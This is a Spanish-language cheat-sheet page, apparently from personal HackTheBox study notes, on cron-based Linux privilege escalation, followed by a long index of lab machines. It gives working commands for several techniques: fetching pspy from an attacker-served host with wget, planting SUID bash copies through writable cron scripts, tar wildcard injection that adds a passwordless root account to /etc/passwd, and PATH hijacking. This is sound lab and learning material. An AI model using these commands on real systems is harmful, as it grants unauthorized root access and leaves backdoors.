# Técnica: cron

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**169 máquina(s)** mencionan esta técnica.

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<IP>` · `<TU_IP>`

### Enumerar (los archivos de cron no siempre alcanzan)

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l
ls -la /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all
```

### `pspy` — ver los cron aunque no tengas permisos

Es la herramienta clave: muestra procesos en ejecución en vivo.

```bash
# Desde tu Kali, servirlo
python3 -m http.server 8000

# En la víctima
wget http://<TU_IP>:8000/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000
```

Dejalo corriendo unos minutos. Te va a mostrar la línea de comandos exacta de
cada tarea periódica, con el usuario que la ejecuta.

### Qué buscar

- Un script en cron que **podés escribir** → metele la escalada.
- Un script que corre como root desde un directorio **escribible**.
- Rutas **relativas** en cron → PATH hijacking.
- **Wildcard injection** (`tar *`, `rsync *`, `chown *`).

### Explotación directa

```bash
# Caso 1: el script es escribible
ls -la /opt/script.sh
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/script.sh
# Esperar a que corra, y después:
/tmp/rootbash -p
```

```bash
# Caso 2: el DIRECTORIO es escribible
#   * * * * * root /opt/backup/run.sh
ls -la /opt/backup/
# Si podés renombrar run.sh y poner el tuyo:
mv /opt/backup/run.sh /opt/backup/run.sh.bak
printf '#!/bin/bash\ncp /bin/bash /tmp/rb && chmod 4755 /tmp/rb\n' > /opt/backup/run.sh
chmod +x /opt/backup/run.sh
```

```bash
# Caso 3: wildcard injection con tar
#   Cron hace:  cd /opt && tar -czf backup.tar.gz *
cd /opt
printf 'echo "pwned::0:0:root:/root:/bin/bash" >> /etc/passwd\n' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# Esperar el cron, y después:  su pwned
```

### PATH hijacking en cron

```bash
# Si el cron tiene PATH= y ejecuta un comando sin ruta absoluta
#   * * * * * root backup
# Y /usr/local/bin está ANTES en el PATH del cron:
printf '#!/bin/bash\ncp /bin/bash /tmp/rb && chmod 4755 /tmp/rb\n' > /usr/local/bin/backup
chmod +x /usr/local/bin/backup
```

### Si el cron no es explotable

No te claves. Pasá a las otras vías: ver [[LPE-Linux]] para el orden completo.

## Referencias

- [[GTFOBins|GTFOBins (espejo local)]] — https://gtfobins.github.io/

---

## Máquinas

- [[htb-cronos\|Cronos]] — 59 mención(es) · Linux · Medium
- [[htb-permx\|PermX]] — 43 mención(es) · Linux · Easy
- [[htb-interactive\|htb-interactive]] — 33 mención(es)
- [[htb-caption\|Caption]] — 30 mención(es) · Linux · Hard
- [[htb-planning\|Planning]] — 26 mención(es) · Linux · Easy
- [[htb-yummy\|Yummy]] — 25 mención(es) · Linux · Hard
- [[htb-inception\|Inception]] — 23 mención(es) · Linux · Medium
- [[htb-crossfit\|CrossFit]] — 22 mención(es) · Linux · Insane
- [[htb-ellingson\|Ellingson]] — 22 mención(es) · Linux · Hard
- [[htb-phoenix\|Phoenix]] — 22 mención(es) · Linux · Hard
- [[htb-derailed\|Derailed]] — 19 mención(es) · Linux · Insane
- [[htb-reddish\|Reddish]] — 18 mención(es) · Linux · Insane
- [[htb-europa\|Europa]] — 17 mención(es) · Linux · Medium
- [[htb-corporate\|Corporate]] — 16 mención(es) · Linux · Insane
- [[htb-nexus\|Nexus]] — 15 mención(es) · Linux · Easy
- [[htb-pikaboo\|Pikaboo]] — 15 mención(es) · Linux · Hard
- [[htb-crossfittwo\|CrossFitTwo]] — 14 mención(es) · OpenBSD · Insane
- [[htb-race\|Race]] — 14 mención(es) · Linux · Hard
- [[htb-rope\|Rope]] — 14 mención(es) · Linux · Insane
- [[htb-monitors\|Monitors]] — 13 mención(es) · Linux · Hard
- [[htb-sherlock-bumblebee\|Bumblebee]] — 13 mención(es) · Easy
- [[htb-topology\|Topology]] — 13 mención(es) · Linux · Easy
- [[htb-traceback\|Traceback]] — 13 mención(es) · Linux · Easy
- [[htb-imagery\|Imagery]] — 12 mención(es) · Linux · Medium
- [[htb-registry\|Registry]] — 12 mención(es) · Linux · Hard
- [[htb-shrek\|Shrek]] — 12 mención(es) · Linux · Hard
- [[htb-celestial\|Celestial]] — 11 mención(es) · Linux · Medium
- [[htb-kotarak\|Kotarak]] — 10 mención(es) · Linux · Hard
- [[htb-sherlock-brutus\|Brutus]] — 10 mención(es) · Very
- [[htb-zero\|Zero]] — 10 mención(es) · Linux · Insane
- [[htb-fatty\|Fatty]] — 9 mención(es) · Linux · Insane
- [[htb-flujab\|FluJab]] — 9 mención(es) · Linux · Hard
- [[htb-writeup\|Writeup]] — 9 mención(es) · Linux · Easy
- [[htb-attended\|Attended]] — 8 mención(es) · OpenBSD · Insane
- [[htb-book\|Book]] — 8 mención(es) · Linux · Medium
- [[htb-interface\|Interface]] — 8 mención(es) · Linux · Medium
- [[htb-lightweight\|Lightweight]] — 8 mención(es) · Linux · Medium
- [[htb-meta\|Meta]] — 8 mención(es) · Linux · Medium
- [[htb-ypuffy\|Ypuffy]] — 8 mención(es) · OpenBSD · Medium
- [[htb-broscience\|BroScience]] — 7 mención(es) · Linux · Medium
- [[htb-carpediem\|CarpeDiem]] — 7 mención(es) · Linux · Hard
- [[htb-carrier\|Carrier]] — 7 mención(es) · Linux · Medium
- [[htb-era\|Era]] — 7 mención(es) · Linux · Medium
- [[htb-ghoul\|Ghoul]] — 7 mención(es) · Linux · Hard
- [[htb-inject\|Inject]] — 7 mención(es) · Linux · Easy
- [[htb-retired\|Retired]] — 7 mención(es) · Linux · Medium
- [[htb-sandworm\|Sandworm]] — 7 mención(es) · Linux · Medium
- [[htb-sorcery\|Sorcery]] — 7 mención(es) · Linux · Insane
- [[htb-wifinetictwo\|WifineticTwo]] — 7 mención(es) · Linux · Medium
- [[htb-aragog\|Aragog]] — 6 mención(es) · Linux · Medium
- [[htb-conversor\|Conversor]] — 6 mención(es) · Linux · Easy
- [[htb-dyplesher\|Dyplesher]] — 6 mención(es) · Linux · Insane
- [[htb-health\|Health]] — 6 mención(es) · Linux · Medium
- [[htb-oz\|Oz]] — 6 mención(es) · Linux · Hard
- [[htb-playertwo\|PlayerTwo]] — 6 mención(es) · Linux · Insane
- [[htb-previous\|Previous]] — 6 mención(es) · Linux · Medium
- [[htb-variatype\|VariaType]] — 6 mención(es) · Linux · Medium
- [[htb-friendzone\|FriendZone]] — 5 mención(es) · Linux · Easy
- [[htb-jupiter\|Jupiter]] — 5 mención(es) · Linux · Medium
- [[htb-mischief-more-root\|Mischief Additional Roots]] — 5 mención(es)
- [[htb-patents\|Patents]] — 5 mención(es) · Linux · Hard
- [[htb-redpanda\|RedPanda]] — 5 mención(es) · Linux · Easy
- [[htb-slonik\|Slonik]] — 5 mención(es) · Linux · Medium
- [[htb-solidstate\|SolidState]] — 5 mención(es) · Linux · Medium
- [[htb-tentacle\|Tentacle]] — 5 mención(es) · Linux · Hard
- [[htb-alert\|Alert]] — 4 mención(es) · Linux · Easy
- [[htb-altered\|Altered]] — 4 mención(es) · Linux · Hard
- [[htb-backdoor\|Backdoor]] — 4 mención(es) · Linux · Easy
- [[htb-curling\|Curling]] — 4 mención(es) · Linux · Easy
- [[htb-data\|Data]] — 4 mención(es) · Linux · Easy
- [[htb-formulax\|FormulaX]] — 4 mención(es) · Linux · Hard
- [[htb-ghost\|Ghost]] — 4 mención(es) · Windows · Insane
- [[htb-joker\|Joker]] — 4 mención(es) · Linux · Hard
- [[htb-monitored\|Monitored]] — 4 mención(es) · Linux · Medium
- [[htb-oouch\|Oouch]] — 4 mención(es) · Linux · Hard
- [[htb-stacked\|Stacked]] — 4 mención(es) · Linux · Insane
- [[htb-teacher\|Teacher]] — 4 mención(es) · Linux · Easy
- [[htb-waldo\|Waldo]] — 4 mención(es) · Linux · Medium
- [[htb-writer\|Writer]] — 4 mención(es) · Linux · Medium
- [[htb-agile\|Agile]] — 3 mención(es) · Linux · Medium
- [[htb-airtouch\|AirTouch]] — 3 mención(es) · Linux · Medium
- [[htb-bashed\|Bashed]] — 3 mención(es) · Linux · Easy
- [[htb-cerberus\|Cerberus]] — 3 mención(es) · Windows · Hard
- [[htb-chaos\|Chaos]] — 3 mención(es) · Linux · Medium
- [[htb-cybermonday\|CyberMonday]] — 3 mención(es) · Linux · Hard
- [[htb-dab\|Dab]] — 3 mención(es) · Linux · Hard
- [[htb-dog\|Dog]] — 3 mención(es) · Linux · Easy
- [[htb-eureka\|Eureka]] — 3 mención(es) · Linux · Hard
- [[htb-intentions\|Intentions]] — 3 mención(es) · Linux · Hard
- [[htb-investigation\|Investigation]] — 3 mención(es) · Linux · Medium
- [[htb-monitorsthree\|MonitorsThree]] — 3 mención(es) · Linux · Medium
- [[htb-networked\|Networked]] — 3 mención(es) · Linux · Easy
- [[htb-nineveh\|Nineveh]] — 3 mención(es) · Linux · Medium
- [[htb-opensource\|OpenSource]] — 3 mención(es) · Linux · Easy
- [[htb-shared\|Shared]] — 3 mención(es) · Linux · Medium
- [[htb-titanic\|Titanic]] — 3 mención(es) · Linux · Easy
- [[htb-toby\|Toby]] — 3 mención(es) · Linux · Insane
- [[htb-undetected\|Undetected]] — 3 mención(es) · Linux · Medium
- [[htb-admirer\|Admirer]] — 2 mención(es) · Linux · Easy
- [[htb-ai\|AI]] — 2 mención(es) · Linux · Medium
- [[htb-awkward\|Awkward]] — 2 mención(es) · Linux · Medium
- [[htb-bigbang\|BigBang]] — 2 mención(es) · Linux · Hard
- [[htb-doctor\|Doctor]] — 2 mención(es) · Linux · Easy
- [[htb-fries\|Fries]] — 2 mención(es) · Windows · Hard
- [[htb-lacasadepapel\|LaCasaDePapel]] — 2 mención(es) · Linux · Easy
- [[htb-lame-more\|More Lame]] — 2 mención(es)
- [[htb-lantern\|Lantern]] — 2 mención(es) · Linux · Hard
- [[htb-luanne\|Luanne]] — 2 mención(es) · NetBSD · Easy
- [[htb-mirage\|Mirage]] — 2 mención(es) · Windows · Hard
- [[htb-object\|Object]] — 2 mención(es) · Windows · Hard
- [[htb-player\|Player]] — 2 mención(es) · Linux · Hard
- [[htb-rainyday\|RainyDay]] — 2 mención(es) · Linux · Hard
- [[htb-response\|Response]] — 2 mención(es) · Linux · Insane
- [[htb-scriptkiddie\|ScriptKiddie]] — 2 mención(es) · Linux · Easy
- [[htb-sneakymailer\|SneakyMailer]] — 2 mención(es) · Linux · Medium
- [[htb-strutted\|Strutted]] — 2 mención(es) · Linux · Medium
- [[htb-swagshop\|SwagShop]] — 2 mención(es) · Linux · Easy
- [[htb-trickster\|Trickster]] — 2 mención(es) · Linux · Medium
- [[htb-unobtainium\|Unobtainium]] — 2 mención(es) · Linux · Hard
- [[htb-zetta\|Zetta]] — 2 mención(es) · Linux · Hard
- [[htb-armageddon\|Armageddon]] — 1 mención(es) · Linux · Easy
- [[htb-axlle\|Axlle]] — 1 mención(es) · Windows · Hard
- [[htb-bamboo\|Bamboo]] — 1 mención(es) · Linux · Medium
- [[htb-bastard\|Bastard]] — 1 mención(es) · Windows · Medium
- [[htb-beep\|Beep]] — 1 mención(es) · Linux · Easy
- [[htb-blocky\|Blocky]] — 1 mención(es) · Linux · Easy
- [[htb-cobblestone\|Cobblestone]] — 1 mención(es) · Linux · Insane
- [[htb-darkcorp\|DarkCorp]] — 1 mención(es) · Windows · Insane
- [[htb-devarea\|DevArea]] — 1 mención(es) · Linux · Medium
- [[htb-download\|Download]] — 1 mención(es) · Linux · Hard
- [[htb-enterprise\|Enterprise]] — 1 mención(es) · Linux · Medium
- [[htb-epsilon\|Epsilon]] — 1 mención(es) · Linux · Medium
- [[htb-freelancer\|Freelancer]] — 1 mención(es) · Windows · Hard
- [[htb-gavel\|Gavel]] — 1 mención(es) · Linux · Medium
- [[htb-giveback\|Giveback]] — 1 mención(es) · Linux · Medium
- [[htb-hacknet\|HackNet]] — 1 mención(es) · Linux · Medium
- [[htb-haircut\|Haircut]] — 1 mención(es) · Linux · Medium
- [[htb-hawk\|Hawk]] — 1 mención(es) · Linux · Medium
- [[htb-haze\|Haze]] — 1 mención(es) · Windows · Hard
- [[htb-jarvis\|Jarvis]] — 1 mención(es) · Linux · Medium
- [[htb-laser\|Laser]] — 1 mención(es) · Linux · Insane
- [[htb-late\|Late]] — 1 mención(es) · Linux · Easy
- [[htb-magicgardens\|MagicGardens]] — 1 mención(es) · Linux · Insane
- [[htb-metatwo\|MetaTwo]] — 1 mención(es) · Linux · Easy
- [[htb-mist\|Mist]] — 1 mención(es) · Windows · Insane
- [[htb-moderators\|Moderators]] — 1 mención(es) · Linux · Hard
- [[htb-onlyforyou\|OnlyForYou]] — 1 mención(es) · Linux · Medium
- [[htb-orion\|Orion]] — 1 mención(es) · Linux · Easy
- [[htb-pikatwoo\|PikaTwoo]] — 1 mención(es) · Linux · Insane
- [[htb-pilgrimage\|Pilgrimage]] — 1 mención(es) · Linux · Easy
- [[htb-previse\|Previse]] — 1 mención(es) · Linux · Easy
- [[htb-registrytwo\|RegistryTwo]] — 1 mención(es) · Linux · Insane
- [[htb-rustykey\|RustyKey]] — 1 mención(es) · Windows · Hard
- [[htb-scavenger\|Scavenger]] — 1 mención(es) · Linux · Hard
- [[htb-schooled\|Schooled]] — 1 mención(es) · FreeBSD · Medium
- [[htb-seal\|Seal]] — 1 mención(es) · Linux · Medium
- [[htb-sekhmet\|Sekhmet]] — 1 mención(es) · Windows · Insane
- [[htb-sightless\|Sightless]] — 1 mención(es) · Linux · Easy
- [[htb-silentium\|Silentium]] — 1 mención(es) · Linux · Easy
- [[htb-snapped\|Snapped]] — 1 mención(es) · Linux · Hard
- [[htb-static\|Static]] — 1 mención(es) · Linux · Hard
- [[htb-store\|Store]] — 1 mención(es) · Linux · Hard
- [[htb-surveillance\|Surveillance]] — 1 mención(es) · Linux · Medium
- [[htb-tally\|Tally]] — 1 mención(es) · Windows · Hard
- [[htb-tartarsauce\|TartarSauce]] — 1 mención(es) · Linux · Medium
- [[htb-traverxec\|Traverxec]] — 1 mención(es) · Linux · Easy
- [[htb-updown\|UpDown]] — 1 mención(es) · Linux · Medium
- [[htb-wifinetic\|Wifinetic]] — 1 mención(es) · Linux · Easy
- [[chuleta-offsec\|chuleta-offsec]] — 1 mención(es)

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'cron' -v
python3 _sistema/herramientas/buscar.py 'cron' -v --oscp
```
